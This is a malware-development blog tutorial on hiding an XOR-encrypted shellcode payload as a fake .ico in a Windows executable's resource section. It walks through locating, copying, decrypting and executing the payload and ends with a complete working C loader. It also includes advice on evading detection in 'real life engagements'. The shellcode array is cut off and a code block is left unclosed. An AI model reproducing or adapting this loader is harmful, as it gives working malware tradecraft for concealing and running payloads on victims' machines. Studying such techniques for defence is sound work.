# Payload placement: .rsrc section [Permalink](https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/\#payload-placement-rsrc-section "Permalink")

This is a popular way of placement used widely among malware authors,
The resource section of the executable is a section that is meant to store non-executable files, icon files, bitmaps and so on.

Malware authors tend to use it to store their payload but mostly in an encrypted form, that provides a level of obscurity, Also most malware families nowadays has many versions or releases, and having a payload in resource section makes it easy for a malware author to modify the functionality of the payload, he will simply need to just change the resources content, and not the code itself.

For this article we’ll work with a **MessageBox** payload we have been using earlier, but this time let’s append a simple layer of obfuscation, take this payload, XOR it with the value: “ **XYZ**” and save the file as a `.ico`.

```
unsigned char buf[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"

# Adding a resource to our project [Permalink](https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/\#adding-a-resource-to-our-project "Permalink")

Click on **Resources File** -\> **Add** -\> **Netw Item**![P1](https://ry0dan.github.io/assets/images/malware-development/3-0.png)

Choose **Resource File** and once you get a column on the right hand side right clikc on Resource.rc and add the resource -> import your .ico and specify its type as `RCDATA`.

![P2](https://ry0dan.github.io/assets/images/malware-development/3-1.png)![P3](https://ry0dan.github.io/assets/images/malware-development/3-2.png)

After we have added our encrypted .ico file we need to be able to retrieve its contents in order to decrypt it and finally execute it.

# Retrieving payload contents [Permalink](https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/\#retrieving-payload-contents "Permalink")

Our process will be as follows:

- **FindResourceW** API call: locate the resource using its ID and type.
- **LoadResource** API call: Load the contents of our resource file to memory.
- **LockResource** API call: obtain a pointer to the data.
- Allocate memory out of .rsrc section and copy our data.
- Begin execution.

## Locating resource [Permalink](https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/\#locating-resource "Permalink")

```
HRSRC hRsrc = FindResourceW(NULL,MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
```

“HRSRC” type stands for “Handle to a Resource.” It represents a handle to a resource that is loaded, and The `MAKEINTRESOURCE` macro is a utility macro for converting an integer value into a resource identifier at this case we passed `IDR_RCDATA1` which is teh ID of our resource, we can find the ID in the `resource.h` file ( **Do not forget to include it**).
![P4](https://ry0dan.github.io/assets/images/malware-development/3-4.png)

The last parameter is just the type of the resource and we specified that earlier when we first imported our resource.

## Loading resource contents [Permalink](https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/\#loading-resource-contents "Permalink")

We use this code and pass the handle we got above:

```
HGLOBAL hGRsrc = LoadResource(NULL, hRsrc);
```

## Obtain a pointer [Permalink](https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/\#obtain-a-pointer "Permalink")

```
PVOID RsrcAd = LockResource(hGRsrc);
```

The variable **RsrcAd** will point to our data, but it will still be a pointer inside .rsrc section, to do any operations on the data such as writing, decrypting, executing, etc. We better allocate a memory region and copy our data to that region.

For this we can simply use **VirtualAlloc()** or any other memory allocation API.

## Decrypting the payload [Permalink](https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/\#decrypting-the-payload "Permalink")

Before allocating memory we need to calculate the size of our resource:

```
DWORD dwSize = SizeofResource(NULL, hRsrc);
```

Then using **VirtualAlloc()**.

```
PVOID pAddress = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

> Again: passing **PAGE\_EXECUTE\_READWRITE** is a big red flag, this is usually not the best way to do memory allocation, instead in real life engagements we better use **PAGE\_READWRITE** then changing the memory protection using **VitualProtect()**.

Then copy the data to that region:

```
memcpy(pAddress, RsrcAd, dwSize);
```

We need to implement a function that will take the encrypted data, the key and decrypt our payload:

```
VOID XOR(IN PBYTE pBytes, IN DWORD dwSize, IN char* pKey) {

  for (int i=0;i < dwSize;i++) {
    pBytes[i] = pBytes[i] ^ pKey[i % 3];
  }
}
```

Pass the address and key to decrypt:

```
char key[] = "XYZ";
XOR((PBYTE)pAddress, dwSize, key);
```

# Execution [Permalink](https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-03/\#execution "Permalink")

After we have prepared everything let’s do a quick test to see the payload before and after decryption, make sure it is decrypted successfully.

toggle a breakpoint before and after the XOR operation and check the payload in memory:
Before:

![P5](https://ry0dan.github.io/assets/images/malware-development/3-5.png)

After:

![P6](https://ry0dan.github.io/assets/images/malware-development/3-6.png)

Now as we see, we have successfully decrypted our payload, and already it’s in an executable region of memory, we can simply execute it now with **CreateThread()** API call.

```
if (CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL) == NULL) {
    printf("CreateThread Failed with Error %x", GetLastError());
    return -1;
  };
```

And always remember to trace the execution using a debugger to confirm everything is working properly :) .

Final Code:

```
#include <Windows.h>
#include "resource.h"
#include <stdio.h>

VOID XOR(IN PBYTE pBytes, IN DWORD dwSize, IN char* pKey) {

  for (int i=0;i < dwSize;i++) {
    pBytes[i] = pBytes[i] ^ pKey[i % 3];
  }
}

int main()
{
  HRSRC hRsrc = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

  if (hRsrc == NULL) {
    printf("FindResouceW failed with error: %x", GetLastError());
    return -1;
  }

  HGLOBAL hGRsrc = LoadResource(NULL, hRsrc);

  if (hGRsrc == NULL) {
    printf("LoadResource failed with error: %x", GetLastError());
    return -1;
  }

  PVOID RsrcAd = LockResource(hGRsrc);

  if (RsrcAd == NULL) {
    printf("failed loading resource, error: %x", GetLastError());
    return -1;
  }

  DWORD dwSize = SizeofResource(NULL, hRsrc);

  if (dwSize == NULL) {

    printf("SizeofResource failed with error: %x", GetLastError());
    return -1;
  }

  PVOID pAddress = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  memcpy(pAddress, RsrcAd, dwSize);

  char key[] = "XYZ";

  XOR((PBYTE)pAddress, dwSize, key);

  if (CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL) == NULL) {
    printf("CeateThread Failed with Error %x", GetLastError());
    return -1;
  };

  return 1;
}
